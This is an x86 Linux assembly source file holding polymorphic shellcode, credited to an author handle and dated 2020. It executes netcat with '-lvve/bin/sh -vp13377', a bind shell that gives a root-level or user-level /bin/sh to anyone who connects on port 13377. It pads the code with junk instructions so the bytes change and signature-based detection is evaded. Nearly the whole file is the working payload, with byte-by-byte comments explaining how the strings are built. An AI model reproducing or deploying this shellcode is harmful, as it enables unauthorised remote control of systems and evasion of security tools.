; Author: Anonymous (chaossecurity wordpress)
; Polymorphic version: @bugsam
; Date: 07/30/2020
; Original: 64 bytes
; Version: 62 bytes

global _start

section .text
_start:
	push 0xb
	pop eax			; (EAX) SYS_execve
	cdq			; (EDX) clear

	push dx
	push 0x37373333		; 0x37 ASCII '7'; 0x37 ASCII '7'; 0x33 ASCII '3'; 0x33 ASCII '3'
	push 0x3170762d		; 0x31 ASCII '1'; 0x70 ASCII 'p'; 0x76 ASCII 'v'; 0x2d ASCII '-'
	lea edi, [esp] 		; (EDI) -> argv[2] '-vp13377'

	push dx
	push 0x68732f2f		; 0x68 ASCII 'h'; 0x73 ASCII 's'; 0x2f ASCII '/'; 0x2f ASCII '/'
	push 0x6e69622f		; 0x6e ASCII 'n'; 0x69 ASCII 'i'; 0x62 ASCII 'b'; 0x2f ASCII '/'
	push 0x656c762d		; 0x65 ASCII 'e'; 0x6c ASCII 'l'; 0x76 ASCII 'v'; 0x2d ASCII '-'
	lea ecx, [esp]		; (ECX) -> argv[1] '-lvve/bin/sh'

	stc			; trash

	push edx
	push 0x636e2f2f		; 0x00 ASCII NUL (end of string); 0x63 ASCII 'c'; 0x6e ASCII 'n'; 0x2f ASCII '/'
	push dword[esp+0xc]	; 0x68 ASCII 'n'; 0x69 ASCII 'i'; 0x62 ASCII 'b'; 0x2f ASCII '/'
	lea ebx, [esp]		; (EBX) -> argv[0] AND *pathname '/bin/nc'

	cld			; trash

	push edx		; end of array argv[c] NULL pointer and *envp[]
	push edi		; address of argv[2] (second argument)
	push ecx		; address of argv[1] (first argument)
	push ebx		; address of argv[0] (filename of executable)
	mov ecx, esp		; (ECX) *argv[]
	int 0x80		; call syscall SYS_execve, on success does not return 

